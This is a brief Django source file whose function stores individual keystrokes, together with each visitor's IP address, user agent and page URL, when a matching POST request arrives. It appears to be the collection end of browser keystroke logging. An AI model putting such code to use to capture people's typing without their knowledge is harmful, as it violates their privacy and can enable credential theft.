from pages.models import GlobalKeystroke

def keystroke_processor(request, id, ip, user_agent, keystroke, page_url):

    if request.POST.get("id") == "keystroke_request":

        GlobalKeystroke.objects.create(ip_address=ip, user_agent=user_agent, keystroke=keystroke, page_url=page_url)
